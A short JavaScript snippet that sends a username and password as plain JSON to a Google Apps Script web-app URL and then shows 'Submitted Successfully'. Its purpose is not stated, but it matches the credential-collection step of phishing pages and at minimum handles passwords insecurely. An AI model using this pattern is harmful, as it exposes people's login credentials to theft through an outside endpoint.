const url="https://script.google.com/macros/s/AKfycbxfAPByykld75--6V5MH-mG3R-OIwQQX2KLxO6oiO_0eTMZtC9djBPPwHY6F-sbynTz/exec";

fetch(url,{
    method:"POST",
    body:JSON.stringify({
        username:username,
        password:password
    })
})
.then(res=>res.text())
.then(data=>{
    alert("Submitted Successfully");
});
